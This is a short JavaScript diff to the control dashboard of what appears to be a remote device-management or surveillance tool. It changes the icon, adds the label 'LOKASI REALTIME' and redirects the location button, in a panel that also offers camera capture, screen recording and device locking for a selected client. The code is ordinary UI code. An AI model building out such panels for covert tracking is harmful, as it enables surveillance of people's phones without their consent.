@@ -650,12 +650,13 @@
                 else if (btn === 'apps') icon = 'fa-th-large';
                 else if (btn === 'lock') icon = 'fa-user-lock';
                 else if (btn === 'openurl') icon = 'fa-external-link-alt';
-                else if (btn === 'get_location') icon = 'fa-map-marker-alt';
+                else if (btn === 'get_location') icon = 'fa-crosshairs';
                 else if (btn === 'flash') icon = 'fa-bolt';
                 else if (btn === 'screenrecord') icon = 'fa-video';
                 else if (btn === 'takebackpic') icon = 'fa-camera-retro';
                 else if (btn === 'takefrontpic') icon = 'fa-camera';
 
+                if (btn === 'get_location') label = 'LOKASI REALTIME';
                 if (btn === 'lock') label = 'LOCK DEVICE';
                 if (btn === 'flash') label = flashOn ? 'FLASH ON' : 'FLASH OFF';
                 if (btn === 'screenrecord') label = screenRecordOn ? 'REC ON' : 'REC OFF';
@@ -670,7 +671,9 @@
             if (action === 'flash') { toggleFlash(); updateMainDashboard(); }
             else if (action === 'screenrecord') { toggleScreenRecord(); updateMainDashboard(); }
             else if (action === 'takebackpic' || action === 'takefrontpic') openModal(action);
-            else if (action === 'get_location') sendCommand('get_location');
+            else if (action === 'get_location') {
+                window.location.href = `/location?client_id=${selectedClientId}`;
+            }
             else if (action === 'lock') openModal('lock');
             else openModal(action);
         };
